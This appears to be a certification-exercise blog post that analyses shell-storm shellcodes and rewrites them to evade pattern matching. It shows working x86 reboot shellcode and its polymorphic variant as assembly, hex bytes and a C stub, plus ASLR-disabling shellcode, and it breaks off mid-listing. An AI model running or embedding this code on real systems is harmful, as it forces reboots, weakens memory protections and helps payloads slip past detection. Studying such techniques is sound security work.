@@ -1,0 +1,786 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Brett Lischalk | SLAE Problem 6: Shell-Storm.com Shellcode Analysis and Polymorphic Modification</title>
+  <meta name="description" content="SLAE Problem 6: Shell-Storm.com Shellcode Analysis and Polymorphic Modification">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="SLAE Problem 6: Shell-Storm.com Shellcode Analysis and Polymorphic Modification">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="http://localhost:4000/posts/slae-problem-6-shell-storm-polymorphism">
+  <meta property="og:description" content="SLAE Problem 6: Shell-Storm.com Shellcode Analysis and Polymorphic Modification">
+  <meta property="og:site_name" content="Brett Lischalk">
+  <meta property="og:image" content="http://localhost:4000/assets/og-image.jpg">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="http://localhost:4000/posts/slae-problem-6-shell-storm-polymorphism">
+  <meta name="twitter:title" content="SLAE Problem 6: Shell-Storm.com Shellcode Analysis and Polymorphic Modification">
+  <meta name="twitter:description" content="SLAE Problem 6: Shell-Storm.com Shellcode Analysis and Polymorphic Modification">
+  <meta name="twitter:image" content="http://localhost:4000/assets/og-image.jpg">
+
+  <link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
+  <link href="http://localhost:4000/feed.xml" type="application/rss+xml" rel="alternate" title="Brett Lischalk Last 10 blog posts" />
+
+  
+    <link type="text/css" rel="stylesheet" href="/assets/dark.css">
+  
+</head>
+
+<body>
+  <main role="main">
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav reveal">
+  <a href="/" class="header-logo" title="Brett Lischalk">Brett Lischalk</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <span class="icon icon-android-person"></span>
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/blischalk" target="_blank" title="Twitter">
+          <span class="icon icon-social-twitter"></span>
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a href="https://github.com/blischalk" target="_blank" title="GitHub">
+          <span class="icon icon-social-github"></span>
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/brett-lischalk-3104537" target="_blank" title="LinkedIn">
+          <span class="icon icon-social-linkedin"></span>
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a href="mailto:brett@brettlischalk.com" target="_blank" title="Email">
+          <span class="icon icon-at"></span>
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="/feed.xml" target="_blank" title="RSS">
+          <span class="icon icon-social-rss"></span>
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+        <article class="article reveal">
+          <header class="article-header">
+            <h1>SLAE Problem 6: Shell-Storm.com Shellcode Analysis and Polymorphic Modification</h1>
+            <div class="article-list-footer">
+              <span class="article-list-date">
+                January 9, 2017
+              </span>
+              <span class="article-list-divider">-</span>
+              <span class="article-list-minutes">
+                
+                
+                  17 minute read
+                
+              </span>
+              <span class="article-list-divider">-</span>
+              <div class="article-list-tags">
+                
+                  <a href="/tag/asm">asm</a>
+                
+                  <a href="/tag/shellcode">shellcode</a>
+                
+                  <a href="/tag/polymorphic">polymorphic</a>
+                
+              </div>
+            </div>
+          </header>
+
+          <div class="article-content">
+            <p>This blog post has been created for completing the requirements for the SecurityTube
+Linux Assembly Expert certification:
+<a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert"><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert</a></a></p>
+
+<p>Student ID: SLAE-824</p>
+
+<h2 id="requirements">Requirements</h2>
+
+<ul>
+  <li>Take 3 shellcodes from Shell-Storm and create polymorphic versions
+of them to beat pattern matching</li>
+  <li>The polymorphic versions cannot be larger than 150% of the existing
+shellcode</li>
+  <li>Bonus points for making it shorter in length than original</li>
+</ul>
+
+<h3 id="approach">Approach</h3>
+
+<p>I have chosen the following 3 shellcodes to make polymorphic from
+<a href="http://shell-storm.org/shellcode/">shell-strom.org</a>:</p>
+
+<ul>
+  <li><a href="http://shell-storm.org/shellcode/files/shellcode-831.php">reboot</a></li>
+  <li><a href="http://shell-storm.org/shellcode/files/shellcode-813.php">disable aslr</a></li>
+  <li><a href="http://shell-storm.org/shellcode/files/shellcode-560.php">unlink /etc/passwd and exit</a></li>
+</ul>
+
+<p>My approach will be to:</p>
+
+<ul>
+  <li>Take each shellcode and analyze it to understand what it does</li>
+  <li>Place it in a sample stub c program to try it out to make sure it
+works before modification</li>
+  <li>Modify the shellcode with garbage instructions and equivalent
+instructions</li>
+  <li>Place the modified shellcode into the stub c program and verify that
+it continues to work properly</li>
+</ul>
+
+<p>The source code for this exercise can be found <a href="https://github.com/blischalk/slae/tree/master/exercise6">here</a></p>
+
+<h3 id="shellcode-1-reboot">Shellcode 1: Reboot</h3>
+
+<p>The shellcode for rebooting a system looks like the following. I have
+converted the AT&amp;T syntax to Intel but other than that the commands
+are the same. Lets analyze it and try to understand what it does.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="kr">global</span> <span class="n">_start</span>
+<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
+  <span class="n">_start</span><span class="o">:</span>
+    <span class="k">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>    <span class="c">; zero out eax</span>
+    <span class="k">push</span>   <span class="n">eax</span>        <span class="c">; place 0x00000000 on the stack</span>
+    <span class="k">push</span>   <span class="mh">0x746f6f62</span> <span class="c">; push toob to the stack</span>
+    <span class="k">push</span>   <span class="mh">0x65722f6e</span> <span class="c">; push er/n to the stack</span>
+    <span class="k">push</span>   <span class="mh">0x6962732f</span> <span class="c">; push ibs/ to the stack</span>
+    <span class="k">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">esp</span>    <span class="c">; place pointer to /sbin/reboot string on stack</span>
+    <span class="k">push</span>   <span class="n">eax</span>        <span class="c">; place 0x00000000 on the stack</span>
+    <span class="k">push</span> <span class="n">word</span> <span class="mh">0x662d</span>  <span class="c">; push f- to the stack</span>
+    <span class="k">mov</span>    <span class="n">esi</span><span class="p">,</span><span class="n">esp</span>    <span class="c">; place pointer to -f argument to the stack</span>
+    <span class="k">push</span>   <span class="n">eax</span>        <span class="c">; push 0x00000000 on the stack</span>
+    <span class="k">push</span>   <span class="n">esi</span>        <span class="c">; place pointer to -f argument on the stack</span>
+    <span class="k">push</span>   <span class="n">ebx</span>        <span class="c">; place pointer to /sbin/reboot string on the stack</span>
+    <span class="k">mov</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">esp</span>    <span class="c">; move pointer to argument array /sbin/reboot, -f on the stack</span>
+    <span class="k">mov</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0xb</span>     <span class="c">; place system call 11 (execve) in al</span>
+    <span class="k">int</span>    <span class="mh">0x80</span>       <span class="c">; call execve</span></code></pre></figure>
+
+<p>This looks pretty familiar. The shellcode simply populates the registers
+with the arguments that execve requires:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="n">execve</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">envp</span><span class="p">[]);</span></code></pre></figure>
+
+<p>And then executes it. Lets go ahead and throw it in a stub c program and
+make sure it works but before we do, lets write a little bash function to
+place in our .bashrc as I’ve grown tired having to derive the proper
+command line incantation to dump the shellcode of a binary. Here we go:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="k">function </span>dumpsc <span class="o">{</span>
+  objdump -d ./<span class="nv">$1</span>|grep <span class="s1">'[0-9a-f]:'</span>|grep -v <span class="s1">'file'</span>|cut -f2 -d:|cut -f1-7 -d<span class="s1">' '</span>|tr -s <span class="s1">' '</span>|tr <span class="s1">'\t'</span> <span class="s1">' '</span>|sed <span class="s1">'s/ $//g'</span>|sed <span class="s1">'s/ /\\x/g'</span>|paste -d <span class="s1">''</span> -s |sed <span class="s1">'s/^/"/'</span>|sed <span class="s1">'s/$/"/g'</span>
+<span class="o">}</span></code></pre></figure>
+
+<p><em>Note: if placing shellcode in cstub doesn’t work it may be because
+the cut -f needs to be adjusted to account for the columns of opcodes
+in the objdump -d output.</em></p>
+
+<p>Execellent. Now:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">dumpsc reboot
+<span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2d</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e6</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span></code></pre></figure>
+
+<p>There is our shellcode. Lets throw it in our stub C program. Actually, I’ve
+grown tired of doing that too. Lets write a function to do that for us:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="k">function </span>asmtocstub <span class="o">{</span>
+<span class="nv">BYTES</span><span class="o">=</span><span class="sb">`</span>dumpsc <span class="nv">$1</span><span class="sb">`</span>
+<span class="nv">CFILE</span><span class="o">=</span><span class="s2">"</span><span class="nv">$2</span><span class="s2">.c"</span>
+<span class="nb">echo</span> <span class="s2">"The bytes of the shellcode are:"</span>
+<span class="nb">echo</span> <span class="nv">$BYTES</span>
+<span class="nb">echo</span> <span class="s2">"Writing shellcode to </span><span class="nv">$CFILE</span><span class="s2">"</span>
+cat <span class="sh">&lt;&lt; EOF &gt; $CFILE
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+unsigned char shellcode[] = $BYTES;
+
+int main(void)
+{
+
+  printf("Shellcode Length:  %d\n", strlen(shellcode));
+  int (*ret)() = (int(*)())shellcode;
+  ret();
+}
+EOF
+</span>gcc -g -fno-stack-protector -z execstack -m32 <span class="nv">$CFILE</span> -o <span class="nv">$2</span>
+<span class="o">}</span></code></pre></figure>
+
+<p>And now:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>asmtocstub reboot myshellcode
+The bytes of the shellcode are:
+<span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2d</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e6</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+Writing shellcode to myshellcode.c
+<span class="gp">$ </span>cat myshellcode.c
+<span class="c">#include &lt;stdio.h&gt;</span>
+<span class="c">#include &lt;string.h&gt;</span>
+
+unsigned char shellcode[] <span class="o">=</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2d</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e6</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>;
+
+int main<span class="o">(</span>void<span class="o">)</span>
+<span class="o">{</span>
+
+  <span class="nb">printf</span><span class="o">(</span><span class="s2">"Shellcode Length:  %d</span><span class="se">\n</span><span class="s2">"</span>, strlen<span class="o">(</span>shellcode<span class="o">))</span>;
+  int <span class="o">(</span><span class="k">*</span>ret<span class="o">)()</span> <span class="o">=</span> <span class="o">(</span>int<span class="o">(</span><span class="k">*</span><span class="o">)())</span>shellcode;
+  ret<span class="o">()</span>;
+<span class="o">}</span>
+<span class="gp">$ </span>./myshellcode
+Length: 36
+reboot: Need to be root
+<span class="err">$</span></code></pre></figure>
+
+<p>Excellent. That should speed up productivity. We can see from the
+output that when we execute the shellcode c program that it does
+in fact try to run (although you need to be root to reboot the system).</p>
+
+<p>Since we know that it works, lets start making it polymorphic.</p>
+
+<h3 id="ploymorphic-reboot-shellcode">Ploymorphic Reboot Shellcode</h3>
+
+<p>Returning to our original shellcode, replace some instructions
+with equivalent instructions and add some NOP garbage as well:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="kr">global</span> <span class="n">_start</span>
+<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
+  <span class="n">_start</span><span class="o">:</span>
+    <span class="c">; zero out eax</span>
+    <span class="k">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
+
+    <span class="k">push</span>   <span class="n">eax</span>        <span class="c">; place 0x00000000 on the stack</span>
+
+    <span class="c">;push   0x746f6f62 ; push toob to the stack</span>
+    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="mh">0x736e6e61</span> <span class="c">; place obfuscated toob in ebx</span>
+    <span class="k">add</span> <span class="n">ebx</span><span class="p">,</span> <span class="mh">0x01010101</span> <span class="c">; add to bring ebx to 0x746f6f62</span>
+    <span class="k">push</span> <span class="n">ebx</span> <span class="c">; push toob to the stack</span>
+
+    <span class="c">;push   0x65722f6e ; push er/n to the stack</span>
+    <span class="c">;push   0x6962732f ; push ibs/ to the stack</span>
+    <span class="k">mov</span> <span class="n">dword</span> <span class="err">[</span><span class="n">esp</span><span class="o">-</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span>  <span class="mh">0x65722f6e</span> <span class="c">; push er/n to the stack</span>
+    <span class="k">mov</span> <span class="n">dword</span> <span class="err">[</span><span class="n">esp</span><span class="o">-</span><span class="mi">8</span><span class="err">]</span><span class="p">,</span> <span class="mh">0x6962732f</span> <span class="c">; push ibs/ to the stack</span>
+    <span class="k">sub</span> <span class="n">esp</span><span class="p">,</span> <span class="mi">8</span>
+
+    <span class="k">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">esp</span>    <span class="c">; place pointer to /sbin/reboot string on stack</span>
+    <span class="k">push</span>   <span class="n">eax</span>        <span class="c">; place 0x00000000 on the stack</span>
+    <span class="k">push</span> <span class="n">word</span> <span class="mh">0x662d</span>  <span class="c">; push f- to the stack</span>
+    <span class="k">mov</span>    <span class="n">esi</span><span class="p">,</span><span class="n">esp</span>    <span class="c">; place pointer to -f argument to the stack</span>
+    <span class="k">push</span>   <span class="n">eax</span>        <span class="c">; push 0x00000000 on the stack</span>
+    <span class="k">push</span>   <span class="n">esi</span>        <span class="c">; place pointer to -f argument on the stack</span>
+    <span class="k">push</span>   <span class="n">ebx</span>        <span class="c">; place pointer to /sbin/reboot string on the stack</span>
+    <span class="k">mov</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">esp</span>    <span class="c">; move pointer to argument array /sbin/reboot, -f on the stack</span>
+
+    <span class="k">mov</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0xb</span>     <span class="c">; place system call 11 (execve) in al</span>
+
+    <span class="k">int</span>    <span class="mh">0x80</span>       <span class="c">; call execve</span></code></pre></figure>
+
+<p>Lets compile our new polymorphic reboot version and see if it still works:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>./compile.sh polyreboot
+<span class="o">[</span>+] Assembling with Nasm ...
+<span class="o">[</span>+] Linking ...
+<span class="o">[</span>+] Done!
+<span class="gp">$ </span>./polyreboot
+reboot: Need to be root
+<span class="gp">$ </span>asmtocstub polyreboot polyrebootstub
+The bytes of the shellcode are:
+<span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">bb</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">f8</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">ec</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2d</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e6</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+Writing shellcode to polyrebootstub.c
+<span class="gp">$ </span>./polyrebootstub
+Shellcode Length:  52
+reboot: Need to be root</code></pre></figure>
+
+<p>After our obfuscation our shellcode still works. Perfect. The size of the
+shellcode has grown from 36 to 52 bytes. We have kept it under the 150% size
+increase limitation. Next up…</p>
+
+<h2 id="shellcode-2-aslr-deactivation">Shellcode 2: ASLR Deactivation</h2>
+
+<p>The next shellcode disables ASLR on Linux x86 systems. It can be found
+<a href="http://shell-storm.org/shellcode/files/shellcode-813.php">here</a>. Once
+again, lets do some analysis before we go and try to run it.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="kr">global</span> <span class="n">_start</span>
+<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
+  <span class="n">_start</span><span class="o">:</span>
+    <span class="k">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span> <span class="c">; Clear out eax</span>
+    <span class="k">push</span>   <span class="n">eax</span>     <span class="c">; Push 0x00000000 onto the stack</span>
+    <span class="k">push</span>   <span class="mh">0x65636170</span> <span class="c">; Push ecap onto the stack</span>
+    <span class="k">push</span>   <span class="mh">0x735f6176</span> <span class="c">; Push s_av onto the stack</span>
+    <span class="k">push</span>   <span class="mh">0x5f657a69</span> <span class="c">; Push _ezi onto the stack</span>
+    <span class="k">push</span>   <span class="mh">0x6d6f646e</span> <span class="c">; Push modn onto the stack</span>
+    <span class="k">push</span>   <span class="mh">0x61722f6c</span> <span class="c">; Push ar/l onto the stack</span>
+    <span class="k">push</span>   <span class="mh">0x656e7265</span> <span class="c">; Push enre onto the stack</span>
+    <span class="k">push</span>   <span class="mh">0x6b2f7379</span> <span class="c">; Push k/sy onto the stack</span>
+    <span class="k">push</span>   <span class="mh">0x732f636f</span> <span class="c">; Push s/co onto the stack</span>
+    <span class="k">push</span>   <span class="mh">0x72702f2f</span> <span class="c">; Push rp// onto the stack</span>
+    <span class="c">; At this point //proc/sys/kernel/randomize_va_space</span>
+    <span class="c">; Has been pushed onto the stack</span>
+    <span class="c">; According to [this](http://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization)</span>
+    <span class="c">; This seems to be the recommended way to be disabling ASLR</span>
+    <span class="k">mov</span>    <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span> <span class="c">; place a pointer to our string on the stack</span>
+
+    <span class="k">mov</span>    <span class="n">cx</span><span class="p">,</span> <span class="mh">0x2bc</span> <span class="c">; mode for sys_creat call</span>
+    <span class="c">; gdb --batch --ex "print /o 0x02bc" $1 = 01274</span>
+    <span class="c">; consulting the man page table for mode we find</span>
+    <span class="c">; S_IWUSR    00200 user has write permission</span>
+    <span class="c">; S_IRWXG    00070 group has read, write, and execute permission</span>
+    <span class="c">; S_IROTH    00004 others have read permission</span>
+    <span class="c">; S_ISVTX  0001000 sticky bit</span>
+
+    <span class="k">mov</span>    <span class="n">al</span><span class="p">,</span> <span class="mh">0x8</span> <span class="c">; sys_creat - open or create a file</span>
+    <span class="k">int</span>    <span class="mh">0x80</span> <span class="c">; open the file</span>
+
+    <span class="k">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">eax</span> <span class="c">; save the file descriptor</span>
+    <span class="k">push</span>   <span class="n">eax</span> <span class="c">; push the file descriptor onto the stack</span>
+
+    <span class="c">;; Beginning to setup the write syscall by</span>
+    <span class="c">;; placing the required information into</span>
+    <span class="c">;; the proper registers</span>
+    <span class="c">;; ssize_t write(int fd, const void *buf, size_t count);</span>
+    <span class="k">mov</span>    <span class="n">dx</span><span class="p">,</span><span class="mh">0x3a30</span>  <span class="c">; Push :0 onto the stack</span>
+    <span class="k">push</span>   <span class="n">dx</span> <span class="c">; push it onto the stack</span>
+    <span class="k">mov</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">esp</span>
+    <span class="k">xor</span>    <span class="n">edx</span><span class="p">,</span><span class="n">edx</span>
+    <span class="k">inc</span>    <span class="n">edx</span> <span class="c">; count of bytes to be written which is 1</span>
+    <span class="k">mov</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0x4</span> <span class="c">; sys_write syscall</span>
+    <span class="k">int</span>    <span class="mh">0x80</span>
+
+    <span class="k">mov</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0x6</span> <span class="c">; sys_close syscall</span>
+    <span class="k">int</span>    <span class="mh">0x80</span>   <span class="c">; returns 0 into eax on success</span>
+
+    <span class="k">inc</span>    <span class="n">eax</span>  <span class="c">; increment eax to syscall 1 - exit syscall</span>
+    <span class="k">int</span>    <span class="mh">0x80</span> <span class="c">; exit gracefully</span></code></pre></figure>
+
+<p>Everything seems to look safe to run. Looking at the permissions
+of <code class="highlighter-rouge">/proc/sys/kernel/randomize_va_space</code> we see that it is owned by
+root and can only be written to by root:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>stat /proc/sys/kernel/randomize_va_space
+  File: ‘/proc/sys/kernel/randomize_va_space’
+  Size: 0         	Blocks: 0          IO Block: 1024   regular empty file
+Device: 4h/4d	Inode: 33315       Links: 1
+Access: <span class="o">(</span>0644/-rw-r--r--<span class="o">)</span>  Uid: <span class="o">(</span>    0/    root<span class="o">)</span>   Gid: <span class="o">(</span>    0/    root<span class="o">)</span>
+Access: 2017-01-08 21:05:46.889201002 -0600
+Modify: 2017-01-08 21:39:16.621201002 -0600
+Change: 2017-01-08 21:39:16.621201002 -0600
+ Birth: -</code></pre></figure>
+
+<p>This indicates that our shelllcode will need to be run as root to be
+effective. If we compile and run the shellcode with sudo we see that
+it in fact does change the randomization value from 2 to 0. Let’s
+add in some polymorphism and see if we can keep it under 124 bytes
+as we neet to stay under 150% of the original 83 byte size.</p>
+
+<h3 id="polymorphic-aslr-deactivation-shellcode">Polymorphic ASLR Deactivation Shellcode</h3>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="kr">global</span> <span class="n">_start</span>
+<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
+  <span class="n">_start</span><span class="o">:</span>
+    <span class="k">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span> <span class="c">; Clear out eax</span>
+    <span class="k">push</span>   <span class="n">eax</span>     <span class="c">; Push 0x00000000 onto the stack</span>
+
+    <span class="c">; Equivalent instructions for:</span>
+    <span class="c">; push   0x65636170 ; Push ecap onto the stack</span>
+    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="mh">0x66646271</span>
+    <span class="k">sub</span> <span class="n">ebx</span><span class="p">,</span> <span class="mh">0x01010101</span>
+    <span class="k">push</span> <span class="n">ebx</span>
+
+    <span class="k">push</span>   <span class="mh">0x735f6176</span> <span class="c">; Push s_av onto the stack</span>
+    <span class="k">push</span>   <span class="mh">0x5f657a69</span> <span class="c">; Push _ezi onto the stack</span>
+    <span class="k">push</span>   <span class="mh">0x6d6f646e</span> <span class="c">; Push modn onto the stack</span>
+    <span class="k">push</span>   <span class="mh">0x61722f6c</span> <span class="c">; Push ar/l onto the stack</span>
+    <span class="k">push</span>   <span class="mh">0x656e7265</span> <span class="c">; Push enre onto the stack</span>
+    <span class="k">push</span>   <span class="mh">0x6b2f7379</span> <span class="c">; Push k/sy onto the stack</span>
+    <span class="k">push</span>   <span class="mh">0x732f636f</span> <span class="c">; Push s/co onto the stack</span>
+
+    <span class="c">; Equivalent instructions for:</span>
+    <span class="c">; push   0x72702f2f ; Push rp// onto the stack</span>
+    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="mh">0x73713030</span>
+    <span class="k">sub</span> <span class="n">ebx</span><span class="p">,</span> <span class="mh">0x01010101</span>
+    <span class="k">push</span> <span class="n">ebx</span>
+
+
+    <span class="c">; At this point //proc/sys/kernel/randomize_va_space</span>
+    <span class="c">; Has been pushed onto the stack</span>
+    <span class="c">; According to [this](http://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization)</span>
+    <span class="c">; This seems to be the recommended way to be disabling ASLR</span>
+    <span class="k">mov</span>    <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span> <span class="c">; place a pointer to our string on the stack</span>
+
+    <span class="k">cld</span> <span class="c">; For funzies</span>
+
+    <span class="k">mov</span>    <span class="n">cx</span><span class="p">,</span> <span class="mh">0x2bc</span> <span class="c">; mode for sys_creat call</span>
+    <span class="c">; gdb --batch --ex "print /o 0x02bc" $1 = 01274</span>
+    <span class="c">; consulting the man page table for mode we find</span>
+    <span class="c">; S_IWUSR    00200 user has write permission</span>
